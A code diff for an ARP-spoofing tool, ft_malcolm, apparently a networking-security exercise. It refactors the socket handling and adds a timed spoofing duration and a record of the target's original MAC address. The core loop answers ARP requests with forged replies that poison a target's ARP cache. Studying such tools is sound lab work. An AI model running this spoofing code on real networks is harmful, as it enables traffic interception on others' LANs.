@@ -3,8 +3,8 @@
 
 t_data	g_data;
 
-int send_back(int sockfd, struct sockaddr_ll src_addr,
-	struct ethernet_hdr *ethernet, struct arp_hdr *arp)
+int send_back(struct sockaddr_ll src_addr, struct ethernet_hdr *ethernet,
+	struct arp_hdr *arp)
 {
 	int ret;
 	socklen_t addr_len = sizeof(struct sockaddr_ll);
@@ -20,18 +20,18 @@ int send_back(int sockfd, struct sockaddr_ll src_addr,
 
 	/* Changing MAC addresses */
 	ft_memcpy(packet.ethernet.dmac, packet.ethernet.smac, ETH_ADDR_LEN);
-	ft_memcpy(packet.ethernet.smac, g_data.source_mac, sizeof(packet.ethernet.smac));
-	ft_memcpy(packet.arp.tha, packet.arp.sha, sizeof(packet.arp.sha));
-	ft_memcpy(packet.arp.sha, g_data.source_mac, sizeof(packet.arp.sha));
+	ft_memcpy(packet.ethernet.smac, g_data.source_mac, ETH_ADDR_LEN);
+	ft_memcpy(packet.arp.tha, packet.arp.sha, ETH_ADDR_LEN);
+	ft_memcpy(packet.arp.sha, g_data.source_mac, ETH_ADDR_LEN);
 
 	/* Swapping IP addresses */
-	ft_memcpy(tmp_ip, packet.arp.sip, sizeof(packet.arp.sip));
-	ft_memcpy(packet.arp.sip, packet.arp.tip, sizeof(packet.arp.sip));
-	ft_memcpy(packet.arp.tip, tmp_ip, sizeof(packet.arp.sip));
+	ft_memcpy(tmp_ip, packet.arp.sip, IP_ADDR_LEN);
+	ft_memcpy(packet.arp.sip, packet.arp.tip, IP_ADDR_LEN);
+	ft_memcpy(packet.arp.tip, tmp_ip, IP_ADDR_LEN);
 
-	//printf("Sending\n");
-	//debug_packet(&packet.ethernet, &packet.arp);
-	ret = sendto(sockfd, &packet, sizeof(struct arp_packet), 0,
+	/* debug_packet(&packet.ethernet, &packet.arp); */
+
+	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
 		(struct sockaddr *)&src_addr, addr_len);
 
 	if (ret == -1) {
@@ -40,9 +40,6 @@ int send_back(int sockfd, struct sockaddr_ll src_addr,
 		fprintf(stderr, "\n");
 		return -1;
 	}
-
-	// printf("Wrote: %d bytes in socket\n", ret);
-	// debug_packet(&packet.ethernet, &packet.arp);
 
 	return 0;
 }
@@ -59,7 +56,7 @@ int filter_out(uint8_t *ip)
 	return 0;
 }
 
-int handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
+int handle_packet(struct sockaddr_ll src_addr, char *buffer)
 {
 	struct arp_hdr *arp;
 	struct ethernet_hdr *ethernet;
@@ -77,9 +74,20 @@ int handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
 	if (type == ETH_P_ARP && opcode == ARP_REQUEST &&
 		!filter_out(arp->sip)) {
 		debug_packet(ethernet, arp);
+		if (g_data.duration) {
+			printf("Spoofing the target for %d seconds\n", g_data.duration);
+			alarm(g_data.duration);
+		}
+
+		/* Saving original mac of the target */
+		ft_memcpy(g_data.original_mac, ethernet->smac, ETH_ADDR_LEN);
+		dprintf(STDOUT_FILENO, "Original mac: ");
+		print_mac(g_data.original_mac);
+		printf("\n");
+
 		while (g_data.loop) {
 			printf("Spoofing\n");
-			if (send_back(sockfd, src_addr, ethernet, arp) != 0)
+			if (send_back(src_addr, ethernet, arp) != 0)
 				break;
 			clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
 		}
@@ -90,12 +98,12 @@ int handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
 		print_ip(STDOUT_FILENO, arp->sip);
 		dprintf(STDOUT_FILENO, "\n");
 	}
+
 	return 0;
 }
 
 int ft_malcolm(void)
 {
-	int sockfd;
 	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
 	char buffer[len];
 	int ret;
@@ -103,25 +111,22 @@ int ft_malcolm(void)
 	socklen_t addr_len = sizeof(struct sockaddr_ll);
 
 	/* Socket creation */
-	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
+	if ((g_data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
 		fprintf(stderr, "[!] Failed to create socket\n");
 		return 1;
 	}
 
 	/* Initializing signal handler */
 	signal(SIGINT, inthandler);
+	signal(SIGALRM, inthandler);
 
 	printf("Sniffing ARP packets, press CTRL+C to exit...\n");
-	while (g_data.loop)
-	{
-		ret = recvfrom(sockfd, buffer, len, MSG_DONTWAIT,
+	while (g_data.loop) {
+		ret = recvfrom(g_data.sockfd, buffer, len, MSG_DONTWAIT,
 			(struct sockaddr *)&src_addr, &addr_len);
-		if (ret > 0 && handle_packet(sockfd, src_addr, buffer))
+		if (ret > 0 && handle_packet(src_addr, buffer))
 			break ;
 	}
-
-	close(sockfd);
-
 	return 0;
 }
 
@@ -130,7 +135,7 @@ int main(int ac, char **av)
 	/* g_data default values */
 	ft_bzero(&g_data, sizeof(g_data));
 	g_data.frequency = 2; /* 2 Seconds */
-	g_data.loop = 1;
+	g_data.loop = 1; /* The loop is started by default */
 
 	if (parse_option_line(ac, av))
 		return -1;
